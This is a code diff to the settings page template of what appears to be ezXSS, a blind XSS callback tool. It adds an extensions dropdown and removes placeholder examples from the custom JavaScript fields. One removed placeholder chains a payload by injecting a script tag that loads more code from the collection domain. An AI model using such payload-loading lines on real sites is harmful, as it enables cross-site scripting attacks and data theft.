@@ -178,21 +178,37 @@
                                 </div>
 
                                 <div class="form-group">
+                                    <label class="control-label" for="extensions">Extensions</label>
+                                    <div class="extensions-dropdown">
+                                        <input type="hidden" name="extensions" id="extensions-hidden" value="">
+                                        <div class="extensions-display" id="extensions-display">
+                                            <div class="extensions-tags" id="extensions-tags">
+                                                
+                                            </div>
+                                            <div class="extensions-dropdown-btn" id="extensions-dropdown-btn">
+                                                <span class="dropdown-text">Select extensions...</span>
+                                                <span class="caret"></span>
+                                            </div>
+                                        </div>
+                                        <div class="extensions-dropdown-list" id="extensions-dropdown-list" style="display: none;">
+                                            {%foreach extensions}
+                                            <label class="extensions-option">
+                                                <input type="checkbox" value="{extensions->id}" {extensions->checked} data-name="{extensions->name}" data-description="{extensions->description}">
+                                                <span class="extensions-option-text">{extensions->name} - {extensions->description}</span>
+                                            </label>
+                                            {%/foreach}
+                                        </div>
+                                    </div>
+                                </div>
+
+                                <div class="form-group">
                                     <label class="control-label" for="customjs">Custom javascript pre-callback</label>
-                                    <textarea class="form-control" id="customjs" name="customjs"
-                                    placeholder="// Do things or edit values before the callback is send
-ez_rD.dom = 'new value'; // ez_rD holds the data"
-                                        rows=4>{%data customjs}</textarea>
+                                    <textarea class="form-control" id="customjs" name="customjs" rows=4>{%data customjs}</textarea>
                                 </div>
 
                                 <div class="form-group">
                                     <label class="control-label" for="customjs2">Custom javascript post-callback</label>
-                                    <textarea class="form-control" id="customjs2" name="customjs2"
-                                    placeholder="var somedata = {payload: '//{%data domain}/', 'uri': 'https://ezxss.com'};
-ez_cb(somedata, null); // Create another callback
-
-document.head.appendChild(Object.assign(document.createElement('script'),{src:'//{%data domain}/custom'})); // Load another custom payload"
-                                        rows=4>{%data customjs2}</textarea>
+                                    <textarea class="form-control" id="customjs2" name="customjs2" rows=4>{%data customjs2}</textarea>
                                 </div>
 
                                 <button name="settings" type="submit" class="btn">Save</button>
